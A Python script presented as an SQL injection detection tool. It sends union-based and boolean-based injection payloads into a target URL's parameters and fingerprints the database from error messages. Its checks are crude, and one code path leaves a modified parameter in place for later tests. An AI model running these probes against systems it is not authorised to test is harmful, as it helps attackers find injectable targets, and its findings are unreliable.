#!/usr/bin/env python3

import argparse
import json
import os
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode

# SQLi payloads
UNION_PAYLOAD = "' UNION SELECT NULL-- "
BOOLEAN_TRUE = "' AND 1=1-- "
BOOLEAN_FALSE = "' AND 1=2-- "

# DB error signatures
DB_ERRORS = {
    "MySQL": ["you have an error in your sql syntax", "mysql_fetch"],
    "SQLite": ["SQLite3::SQLException", "unrecognized token"],
}

def detect_db_type(response_text):
    for db, patterns in DB_ERRORS.items():
        for pattern in patterns:
            if pattern.lower() in response_text.lower():
                return db
    return "Unknown"

def send_request(method, url, params):
    try:
        if method == "GET":
            r = requests.get(url, params=params, timeout=5)
        else:
            r = requests.post(url, data=params, timeout=5)
        return r
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return None

def extract_params(url):
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    return base_url, {k: v[0] for k, v in params.items()}

def perform_tests(method, url):
    base_url, params = extract_params(url)
    results = {
        "url": url,
        "vulnerable_parameters": [],
        "payloads": {},
        "db_type": None
    }

    for param in params:
        original = params[param]

        # Union-based test
        params[param] = original + UNION_PAYLOAD
        r = send_request(method, base_url, params)
        if r and "null" in r.text.lower():  # crude check
            results["vulnerable_parameters"].append(param)
            results["payloads"][param] = UNION_PAYLOAD
            results["db_type"] = detect_db_type(r.text)
            continue

        # Boolean-based test
        params[param] = original + BOOLEAN_TRUE
        r_true = send_request(method, base_url, params)
        params[param] = original + BOOLEAN_FALSE
        r_false = send_request(method, base_url, params)

        if r_true and r_false and r_true.text != r_false.text:
            results["vulnerable_parameters"].append(param)
            results["payloads"][param] = BOOLEAN_TRUE + " / " + BOOLEAN_FALSE
            results["db_type"] = detect_db_type(r_true.text)

        # Restore original
        params[param] = original

    return results

def save_results(results, filename):
    if not os.path.exists(filename):
        with open(filename, "w") as f:
            json.dump([results], f, indent=4)
    else:
        with open(filename, "r") as f:
            data = json.load(f)
        data.append(results)
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection detection tool")
    parser.add_argument("url", help="Target URL with parameters")
    parser.add_argument("-o", help="Output archive file (default: results.json)", default="results.json")
    parser.add_argument("-X", help="Request method: GET or POST (default: GET)", default="GET")
    args = parser.parse_args()

    results = perform_tests(args.X.upper(), args.url)

    print("\n[+] Scan complete.")
    print(f"Vulnerable Parameters: {results['vulnerable_parameters']}")
    print(f"Database Type: {results['db_type']}")
    print(f"Payloads used: {results['payloads']}")

    save_results(results, args.o)
    print(f"[+] Results saved to {args.o}")

if __name__ == "__main__":
    main()
